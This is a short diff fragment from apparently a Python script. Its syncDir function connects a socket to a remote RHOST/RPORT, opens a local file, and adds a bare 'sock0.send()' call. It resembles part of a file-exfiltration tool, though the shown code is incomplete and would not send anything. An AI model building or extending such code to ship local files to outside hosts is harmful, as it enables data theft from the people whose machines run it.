@@ -40,7 +40,7 @@ def syncDir():
             continue
         sock0.connect((RHOST, RPORT))
         with open(file, 'r') as target:
-            
+            sock0.send()
 
 
 def printIcon():
